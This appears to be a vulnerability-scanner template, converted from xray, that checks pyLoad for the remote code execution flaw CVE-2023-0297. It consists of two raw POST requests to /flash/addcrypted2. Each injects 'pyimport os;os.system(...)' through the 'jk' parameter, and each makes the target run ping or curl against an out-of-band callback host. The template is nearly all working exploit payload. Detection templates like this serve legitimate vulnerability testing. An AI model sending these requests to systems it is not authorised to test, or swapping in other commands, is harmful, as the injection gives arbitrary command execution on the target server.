id: yaml-poc-pyload-pyload-rce-CVE-2023-0297

info:
  name: yaml-poc-pyload-pyload-rce-CVE-2023-0297
  author: jiapeng.han
  severity: critical
  tags: xray-converted,rce,cve-2023-0297
  reference:
    - http://packetstormsecurity.com/files/171096/pyLoad-js2py-Python-Execution.html
    - https://github.com/pyload/pyload/commit/7d73ba7919e594d783b3411d7ddb87885aea782d
    - https://huntr.dev/bounties/3fd606f7-83e1-4265-b083-2e1889a05e65

http:
  - raw:
      - |
        POST /flash/addcrypted2 HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        jk=pyimport%20os;os.system("ping%20-c%201%20{{reverseDomain}}");f=function%20f2(){};&package=xxx&crypted=AAAA&&passwords=aaaa

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
  - raw:
      - |
        POST /flash/addcrypted2 HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        jk=pyimport%20os;os.system("curl%20{{reverseURL}}");f=function%20f2(){};&package=xxx&crypted=AAAA&&passwords=aaaa

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200